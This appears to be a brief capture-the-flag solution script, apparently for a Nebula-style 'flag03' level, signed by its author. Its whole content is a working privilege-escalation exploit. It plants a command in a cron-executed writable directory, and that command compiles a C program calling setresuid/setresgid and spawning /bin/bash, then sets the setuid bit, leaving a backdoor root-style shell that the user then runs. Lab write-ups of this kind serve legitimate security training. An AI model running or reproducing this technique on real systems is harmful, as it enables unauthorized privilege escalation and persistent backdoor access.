# Solution by Farzad E. (me@dNetGuru.com)  / @dNetGuru

echo 'echo -e "#include <unistd.h>\nint main(){setresuid(996, 996, 996);setresgid(996, 996,996);system(\"/bin/bash\");return 0;}" > s.c; gcc s.c -o ./e; chmod +s,a+rx e' > /home/flag03/writable.d/dnetg
watch ls -lia /home/flag03/
./e